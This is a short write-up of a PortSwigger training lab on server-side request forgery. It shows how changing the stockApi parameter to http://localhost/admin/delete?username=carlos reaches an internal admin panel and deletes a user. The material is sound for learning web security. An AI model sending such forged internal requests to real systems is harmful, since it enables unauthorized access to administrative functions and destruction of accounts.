# Lab Writeup: Basic SSRF against the local server

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/ssrf-apprentice/ssrf/lab-basic-ssrf-against-localhost

## Description

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Solution

1. Go to one of the products and click "Check stock" while intercepting the request using Burp
2. Send the intercepted request to repeater and change the `stockApi` value to `http://localhost` then you're able to access the page with admin privilege
   ```
   <section class="top-links">
       <a href=/>Home</a><p>|</p>
       <a href="/admin">Admin panel</a><p>|</p>
       <a href="/my-account">My account</a><p>|</p>
   </section>
   ```
3. Go to `/admin` then you'll see the link to delete `carlos`
   ```
   <div>
       <span>carlos - </span>
       <a href="/admin/delete?username=carlos">Delete</a>
   </div>
   ```
4. Put the link to `stockApi` as value `stockApi=http://localhost/admin/delete?username=carlos` then the challenge should be solved

   ![Basic SSRF Local](/assets/basic-ssrf-local.png)
